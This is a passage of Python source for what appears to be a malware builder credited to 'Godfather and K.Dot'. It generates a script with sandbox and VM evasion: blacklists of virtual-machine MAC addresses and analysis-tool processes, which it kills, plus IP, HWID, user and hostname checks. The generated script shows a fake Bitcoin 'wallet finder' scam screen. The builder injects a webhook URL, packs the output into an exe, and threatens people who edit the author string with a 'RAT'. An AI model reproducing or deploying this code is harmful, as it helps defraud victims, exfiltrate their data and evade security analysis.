        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
                                '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                     "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True

        return debugging

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> bool:
        hwid = (subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read(
        ) + subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read()).decode().split("\n")[1]
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")

        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True

    def self_destruct(self) -> None:
        sys.exit()

from random import randint
import time
from pystyle import *
import string
import random
from colorama import Fore
from slowprint.slowprint import *
import os

os.system("cls")

banner = Center.XCenter('''
   _____           _  __      _   _               
  / ____|         | |/ _|    | | | |              
 | |  __  ___   __| | |_ __ _| |_| |__   ___ _ __ 
 | | |_ |/ _ \ / _` |  _/ _` | __| '_ \ / _ \ '__|
 | |__| | (_) | (_| | || (_| | |_| | | |  __/ |   
  \_____|\___/ \__,_|_| \__,_|\__|_| |_|\___|_|   
 Made by Godfather and K.Dot#0001\n\n
''')


def rannum():
    num = randint(1,9)
    return num

def scam():

    print(Colorate.Vertical(Colors.purple_to_red, banner, 2))

    print(f"{Fore.RED}Please wait while we get things started...{Fore.RESET}\n")

    wallet = input(f"{Fore.RED}Enter your wallet address: {Fore.RESET}")
    time.sleep(2)

    ammount = randint(100,200)
    for i in range(int(ammount)):
        source = string.ascii_lowercase + string.digits
        result_str = ''.join((random.choice(source) for i in range(38)))
        const = 'bc1q'
        address = const + result_str
        print(f'{Fore.GREEN}New address: {address} - Status = {Fore.RED}empty{Fore.RESET}')
        time.sleep(0.1)
    full = (f'{Fore.BLUE}FOUND! : {address} - Status = 0.{rannum()}{rannum()}{rannum()}{Fore.RESET}')
    slowprint(full, 0.5)



if __name__ == "__main__":
    if exists('imp.txt'):
        print('')
    else:
        main()
    scam()"""

rep=code.replace('&WEBHOOK_URL&', WEBHOOK)
with open(f'{NAME}.py', 'w', errors='ignore') as f:
    f.write(rep)

exe = input('Would you like to make it a .exe? y/n ')

if exe == 'y':
    os.system(f'pyinstaller --clean --onefile --key GODFATHER {NAME}.py')
    os.remove(f'{NAME}.py')
    os.remove(f'{NAME}.spec')
else:
    print('Ok, bye!')

if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
    time.sleep(5)
    os._exit(0)